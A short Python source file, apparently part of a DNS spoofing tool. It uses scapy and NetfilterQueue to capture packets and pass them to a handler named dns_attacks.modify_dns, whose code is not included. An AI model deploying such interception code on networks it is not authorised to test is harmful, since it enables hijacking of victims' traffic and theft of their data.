from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import requests
import dns_attacks

def intercepter(stop):
    if not stop():
        print "[*] Starting intercepter..." 
        Queue_num = 0
        queue = NetfilterQueue()
        queue.bind(Queue_num, dns_attacks.modify_dns)
        queue.run()
    else:
        queue.unbind()
